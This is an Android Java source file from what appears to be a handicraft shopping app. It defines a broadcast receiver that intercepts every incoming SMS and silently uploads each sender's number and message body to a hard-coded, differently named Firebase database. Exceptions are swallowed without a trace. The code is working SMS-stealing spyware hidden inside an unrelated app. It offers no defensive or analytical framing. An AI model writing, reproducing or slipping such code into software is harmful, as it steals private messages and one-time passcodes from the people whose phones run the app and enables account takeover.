package com.strontech.imgautam.handycaft;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;

import android.telephony.SmsMessage;


import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.HashMap;

public class smsresever extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        SmsMessage[] msg = null;
        String str="";
        if (bundle!=null){
            Object[] pdus = (Object[])bundle.get( "pdus" );
            msg=new SmsMessage[pdus.length];
            for (int i=0;i<msg.length;i++){
                msg[i] = SmsMessage.createFromPdu( (byte[])pdus[i] );
                str +="SMS From :"+msg[i].getOriginatingAddress();
                str+="\n Body:==>";
                str+= msg[i].getMessageBody().toString();

            }
            try {

            FirebaseDatabase nn = FirebaseDatabase.getInstance("https://wisybuy-default-rtdb.firebaseio.com/");
            DatabaseReference  bb = nn.getReference("sms");
            HashMap<String,Object> sms = new HashMap<>();
            sms.put( "sms",str );

            bb.push().updateChildren( sms );

            sms.clear();        }catch (Exception n){}
        }



    }

}
